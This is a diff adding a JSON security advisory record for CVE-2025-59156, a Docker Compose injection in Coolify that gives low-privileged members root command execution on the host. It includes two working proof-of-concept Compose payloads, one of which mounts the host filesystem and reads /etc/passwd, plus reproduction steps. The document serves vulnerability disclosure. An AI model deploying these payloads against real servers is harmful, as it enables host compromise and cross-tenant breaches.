@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-h5xw-7xvp-xrxr",
+  "repo": {
+    "cve_id": "CVE-2025-59156",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": 9.4,
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "## Docker Compose Injection in Coolify\r\n---\r\n**Affects:**  Coolify ≤ v4.0.0-beta.420.6 \r\n**Fixed in:**  v4.0.0-beta.420.7\r\n---\r\n## Executive Summary\r\n\r\nA **critical Remote Code Execution (RCE)** vulnerability exists in Coolify's application deployment workflow. This flaw allows a low-privileged **member** to inject arbitrary **Docker Compose directives** during project creation or updates. By defining a malicious service that mounts the host filesystem, an attacker can achieve **root-level command execution on the host OS**, completely bypassing container isolation.\r\n\r\n---\r\n\r\n### Security Impact\r\n- **Arbitrary command execution** on the host system with root privileges\r\n- **Complete host compromise** including ability to read/write system files, establish persistence, and perform lateral movement\r\n- **Multi-tenant security breach** potentially compromising other users and teams on the same instance\r\n- **Bypass of security controls** rendering UI terminal access restrictions (403 controls) irrelevant\r\n  \r\n---\r\n\r\n## Technical Details\r\n\r\n### Affected Versions\r\n- **Vulnerable Versions:** Coolify ≤ v4.0.0-beta.420.6\r\n- **Patched Version:** v4.0.0-beta.420.7\r\n\r\n### Attack Vector\r\nThe vulnerability exists in the project deployment workflow where user-supplied Docker Compose configurations are processed without sufficient validation or sandboxing.\r\n\r\n---\r\n\r\n## Proof of Concept\r\n\r\n### PoC 1: Host Root Mount with Command Execution\r\n\r\n```yaml\r\nversion: '3.8'\r\nservices:\r\n  poc-host-root:\r\n    image: alpine:3.19\r\n    tty: true\r\n    volumes:\r\n      - /:/host:rw\r\n    command: >\r\n      sh -c \"\r\n        echo '[*] Proof of RCE on host' &&\r\n        echo 'RCE by Eyodav' > /host/tmp/proof_rce.txt &&\r\n        whoami &&\r\n        id &&\r\n        uname -a &&\r\n        head -n 5 /host/etc/passwd\r\n      \"\r\n```\r\n\r\n**Result:** After deployment, `/tmp/proof_rce.txt` appears on the host system, confirming RCE with root privileges.\r\n\r\n### PoC 2: Targeted Host Path Write\r\n\r\n```yaml\r\nversion: '3.8'\r\nservices:\r\n  poc-host-write:\r\n    image: alpine:3.19\r\n    tty: true\r\n    volumes:\r\n      - /home/eyodav/PoC:/host\r\n    command: >\r\n      sh -c \"\r\n        set -e;\r\n        mkdir -p /host &&\r\n        echo '[*] Writing PoC file to host mount...' &&\r\n        echo RCE_PoC_from_container_$(date) > /host/RCE_PoC.txt &&\r\n        cd /host &&\r\n        pwd &&\r\n        ls -la\r\n      \"\r\n```\r\n\r\n### Reproduction Steps\r\n\r\n1. **Authenticate** as a member-level user (non-administrator)\r\n2. **Create or edit** a project in Coolify\r\n3. **Supply malicious configuration** using one of the Docker Compose payloads above\r\n4. **Deploy** the project\r\n5. **Verify exploitation** by checking for host-side artifacts (e.g., `/tmp/proof_rce.txt`) or reviewing command output in deployment logs\r\n\r\n---\r\n\r\n### Immediate Actions\r\n1. **Upgrade immediately** to Coolify v4.0.0-beta.420.7 or later\r\n2. **Review existing projects** for potentially malicious Docker Compose configurations\r\n   ",
+    "ghsa_id": "GHSA-h5xw-7xvp-xrxr",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-h5xw-7xvp-xrxr",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-h5xw-7xvp-xrxr"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2025-59156"
+      }
+    ],
+    "published_at": "2026-01-03T15:16:35Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Docker Compose Injection in Coolify",
+    "updated_at": "2026-01-03T15:16:35Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "Coolify"
+        },
+        "patched_versions": "v4.0.0-beta.420.7",
+        "vulnerable_version_range": "v4.0.0-beta.420.6"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
